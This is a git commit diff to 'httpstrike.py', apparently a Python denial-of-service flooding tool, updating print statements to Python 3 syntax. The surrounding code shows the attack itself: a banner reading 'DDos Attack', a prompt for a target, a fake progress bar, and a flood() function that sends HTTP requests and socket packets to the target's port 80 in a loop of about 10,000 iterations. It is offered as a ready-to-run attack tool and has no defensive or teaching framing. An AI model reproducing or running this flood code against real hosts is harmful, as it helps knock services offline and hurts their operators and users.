47e95929307ad3fd5a2639a3fb2e0f7300d5f3cc
akrdon <72259513+akrdon@users.noreply.github.com>
2023-02-23 20:58:51 +0530

    Update httpstrike.py

--- httpstrike.py
+++ httpstrike.py
@@ -20,11 +20,13 @@ year = now.year
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : AngelDustSec"
-print "You Tube :https://youtube.com/@Anonymous"
-print "github   : https://github.com/K3ysTr0K3R"
-print "Instagram : https://instagram.com/K3ysTr0K3R>
+
+print ("Author   : AngelDustSec")
+print ("You Tube :https://youtube.com/@Anonymous")
+print ("github   : https://github.com/K3ysTr0K3R")
+print ("Instagram : https://instagram.com/K3ysTr0K3R")
 print
+
 def flood(target):
     req = requests.get(f"http://{target}:80/", headers=useragent)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,20 +34,21 @@ def flood(target):
     sock.sendto(req.content, (target, 80))
     sock.close()
 
-target = input("[!] target? ")
+target = input("!!!!...target = ")
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[                    ] 0% ")
 time.sleep(1)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(3)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(2)
-print "[===============     ] 75%"
+print ("[===============     ] 75%")
 time.sleep(2)
-print "[====================] 100%"
+print ("[====================] 100%")
 time.sleep(1)
 sent = 0
+
 for _ in range(1,10000):
     flood(target) # calling the function/starting flood in for loop
     print(f"[+] Flooding {target} on port 80 for {_} seconds")
